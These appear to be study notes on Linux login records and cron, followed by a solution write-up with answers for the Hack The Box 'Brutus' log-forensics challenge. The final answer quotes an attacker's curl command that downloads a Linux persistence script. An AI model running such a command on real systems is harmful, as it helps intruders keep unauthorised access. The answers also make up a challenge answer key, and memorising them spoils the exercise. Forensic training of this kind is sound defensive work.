
## Theory part :-

> These files are used to store the log-in information of the user, but each file does that differently and are stored inside the `/var/run` and `/var/log` directory.

Linux keeps a record of each time you log in with your user credentials and there comes the use of these 3 files.

- `utmp`: It keeps track of currently logged-in users.
- `wtmp`: It keeps track of historical data of every log-in and logout activity.
- `btmp`: It maintains the record of invalid log-in attempts.

>Remember, these are the binary files and you can not use the cat command or open it in the text editor. They have different commands assigned for that purpose.

### 1) The utmp file - current login session

The utmp file keeps track of the user session in real time. In simple terms, by displaying the content of the utmp file, you can list the currently logged-in users.

###### Viewed using:

- `who` — Shows who is logged in
- `w` — Shows who is logged in and what they are doing.
- `users` — Lists current logged-in usernames
###### Use Case:

- System monitoring
- Live session tracking (e.g., for intrusion detection)

### 2) The wtmp file - login history

Unlike the utmp file, the wtmp file keeps the historical data of users who logged-in and logged out of the system.

In simple terms, it contains the historic data of the utmp file.

###### Description:

- Records **all login/logout events**, **system boots**, **shutdowns**, and **runlevel changes**.
- Grows over time, often rotated by logrotate.

###### Location:

- `/var/log/wtmp`
###### Viewed using:

- `last` — Shows login history:
- `utmpdump` (raw dump):
    `utmpdump /var/log/wtmp`
### Use Case:

- **Forensics**
- **User behavior auditing**
- **Tracking unauthorized access**

--- 

# Confluence server

**Confluence** is a team collaboration software developed by **Atlassian**, typically used for creating, sharing, and collaborating on knowledge, documentation, and wikis. It's widely used in both development and non-development teams.

###  **What is Confluence Server?**

- **Confluence Server** is the **self-hosted version** of Confluence that allows you to run it on your own hardware or cloud infrastructure, as opposed to the cloud-based version hosted by Atlassian.
- It provides features such as creating, organizing, and collaborating on documentation, project plans, meeting notes, and more.


### **Key Features of Confluence Server**

1. **Content Creation**: Write and edit pages using a rich text editor, or switch to wiki markup if you prefer.

2. **Collaborative Editing**: Multiple people can work on a page at the same time.

3. **Permissions and Security**: Granular control over who can view, edit, and manage spaces and pages.

4. **Customizable Templates**: Templates for meeting notes, project plans, and documentation.

5. **Integration with Jira**: You can integrate Confluence with **Jira** (Atlassian’s project management tool) to create seamless workflows between documentation and project tracking.

6. **Macros**: Embed dynamic content, such as Jira issues, calendars, and custom elements, into your pages.

7. **Version History**: Track page versions and revert changes.

---

### What is `cron` in Unix/Linux?

**`cron`** is a **time-based job scheduler** in Unix-like operating systems. It’s used to **automate repetitive tasks** (called "cron jobs") like backups, updates, log rotation, or running scripts at fixed times, dates, or intervals.

### 📘 How It Works

- The **`cron` daemon (`crond`)** runs in the background and checks every minute whether any scheduled jobs need to be run.
- Users and system processes define jobs in **crontab** files (cron tables).

---

### 📁 Types of `crontab` Files

|Crontab Type|Path/Command|Description|
|---|---|---|
|User crontab|`crontab -e`|Each user can create their own scheduled jobs|
|System crontab|`/etc/crontab`|Used by the system to schedule jobs (includes a field for username)|
|Cron.d files|`/etc/cron.d/`|Drop-in files for scheduling jobs (use same format as system crontab)|
|Cron.hourly/daily/etc|`/etc/cron.hourly/`, `/etc/cron.daily/`|Scripts run hourly/daily/weekly/monthly|

---

![[crontab-syntax.png]]
### Examples

|Task|Crontab Line|
|---|---|
|Run every minute|`* * * * * command`|
|Run every day at 2:30 AM|`30 2 * * * /home/user/backup.sh`|
|Every Monday at 5 PM|`0 17 * * 1 /home/user/report.sh`|
|Every 15 minutes|`*/15 * * * * /home/user/cleanup.sh`|

### Gotchas

- Always use **absolute paths** in cron jobs (e.g., `/usr/bin/python3`, not just `python3`).
    
- Environment variables like `PATH` are limited, so set them explicitly if needed.
    
- Output/errors are **not shown** unless you redirect them or use `MAILTO` to get emails.

--- 
# Steps to solve:- 
---------------------

1) **Download the file :** wget "https://challenges-cdn.hackthebox.com/sherlocks/very-easy/Brutus.zip/..."

2) **Unzip the file:**  sudo 7z x Brutus.zip
	
	 There are 3 files namely,
	 - auth.log
	 - utmp.py
	 - wtmp
	



### 1) Analyze the auth.log. What is the IP address used by the attacker to carry out a brute force attack?

- In the `auth.log` , i noticed that several brute force was attempted by the attacker by the IP address as mentioned below.

#### Answer :- 65.2.161.68



### 2) The bruteforce attempts were successful and attacker gained access to an account on the server. What is the username of the account?

#### Answer :- root


### 3) Identify the UTC timestamp when the attacker logged in manually to the server and established a terminal session to carry out their objectives. The login time will be different than the authentication time, and can be found in the wtmp artifact.

#### Answer :- 2024-03-06 06:32:45


### 4) SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker's session for the user account from Question 2?

#### Answer :- 37


### 5) The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?

#### Answer :- cyberjunkie


### 6) What is the MITRE ATT&CK sub-technique ID used for persistence by creating a new account?

#### Answer :- T1136.001


### 7) What time did the attacker's first SSH session end according to auth.log?

#### Answer :- 2024-03-06 06:37:24


### 8) The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?


#### Answer :- /usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh